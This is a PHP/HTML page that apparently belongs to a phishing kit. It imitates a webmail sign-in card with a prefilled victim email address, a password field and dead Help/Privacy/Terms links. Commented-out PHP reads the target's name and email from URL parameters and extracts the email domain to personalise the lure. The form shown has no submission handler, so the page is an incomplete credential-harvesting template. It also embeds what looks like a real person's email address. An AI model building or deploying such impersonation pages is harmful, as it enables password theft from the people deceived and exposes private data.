<?php

// include 'function.php';   
// $name= $_GET['name'];
// $id = $_GET['id'];

// $getdomain = explode('@',$id);
// $userdomain = $getdomain[1];

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
    <link rel="shortcut icon" href="img/icons/ggg.png">
	<title>...</title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <style type="text/css">
  
.input-field {
  position: relative;
  width: 80%;
  margin:40px 5px 20px 5px;

  /*height: 44px;*/
  line-height: 34px;
}
label {
  position: absolute;
  text-align: left;
  padding: 7px;
  top: 0;
  left: 0;
  width: 100%;
  color: #C0c0c0;
  transition: 0.2s all;
  cursor: text;

}
input {
  width: 100%;
  border: 2px solid #c0c0c0;
  outline: 0;
  padding: 0.5rem ;
  border-radius: 5px;
  /*border-bottom: 2px solid #d3d3d3;*/
  box-shadow: none;
  background-color: #fff;
  /*color: #111;*/
}
input:invalid {
  outline: 0;
  // color: #ff2300;
  //   border-color: #fff;
}
input:focus,
input:valid {
  border-color: #186fc3;
  background-color: #fff;
}
input:focus~label,
input:valid~label {
  font-size: 14px;
  top: -24px;
color: #186fc3;
background-color: #fff;
width: auto;padding: 0px; margin-left:  5px;
  /*color: #00dd22;*/
}
.forget{
   padding: 10px;
  color: #186fc3;
  cursor: pointer; 
  margin: 0px 10px 10px 10px;
  width: 38%;
}
.forget:hover{
  background-color: #a9e4f5;
  border-radius: 5px;
}
.cli{
  padding: 10px;
  color: #fff;
  background-color: #186fc3;
  border: 0px;
  width: 100px; 
  border-radius: 4px;
}

.cli:hover{
  background-color: #2e87dd;
}
.text{
  
}

  </style>

</head>
<body style="width: 99%;height: auto;overflow: hidden;">
	<div class="row">
		<div class="col-md-4">
		</div>
		<div class="col-md-4" style="margin: 0px 5px 0px 5px;overflow: hidden;">
			<div class="card" style="border: 0.5px solid #c0c0c0; height: 450px; width: 400px; margin: 100px 0px 0px 0px; stop-color: transparent; border-radius: 10px; overflow: hidden;">
			<CENTER><img src="../img/icons/ggg2.png" style="margin: 50px 0px 5px 0px">
			<h3>Welcome</h3>
			<div style="border: 0.5px solid #c0c0c0; padding:5px; border-radius: 15px;margin: 10px 30px 10px 30px;"><center>
				<i class="fa fa-user-circle-o" aria-hidden="true"></i>
<input name="email"  style="border-radius: 5px; border: 0px solid #c0c0c0;width: 300px; " value="topazdamiantopaz@gmail.com" >
			</center></div></CENTER>
<form autocomplete="off">
 <CENTER>
   <div class="input-field" style="width: 90%; margin: 50px 10px 15px 10px;">
    <input type="password" id="password" autocomplete="off" width="100%" required />
    <label for="password"> Enter your password</label>
  </div>
 </CENTER>
 <div class="row" style="margin-right: 2px;">
   <div class="col-md-6 col-xs-6">
     <p class="forget">Forgot&nbsp;password?</p>
   </div>

   <div class="col-md-6 col-xs-6">
     <button class="cli pull-right">Next</button>
   </div>
 </div>


		</form>	
		</div>
    <div class="row" style="margin: 5px 5px 0px 5px; width: 100%; max-width: 400px;overflow: hidden;">
      <div class="col-xs-6 text"><a href="javascript:void(0)" style="color: #000;">English(united kingdom)</a></div>
      <div class="col-xs-6 pull-right">
        <div class="row">
          <div class="col-xs-4 text"><a href="javascript:void(0)" style="color: #000;">Help</a></div>
          <div class="col-xs-4 text"><a href="javascript:void(0)" style="color: #000;">Privacy</a></div>
          <div class="col-xs-4 text"><a href="javascript:void(0)" style="color: #000;">Terms</a></div>
        </div>
      </div>
    </div>
		</div>
		<div class="col-md-4">
		</div>
	</div>
	
<script>
	
		function myFunction() {
  var x = document.getElementById("pass");
  if (x.type === "password") {
    x.type = "text";
    document.getElementById('eye').style.display="none";
    document.getElementById('slash').style.display="block";
  } else {
    x.type = "password";
    document.getElementById('eye').style.display="block";
    document.getElementById('slash').style.display="none";
  }

	}
</script>
</body>
</html>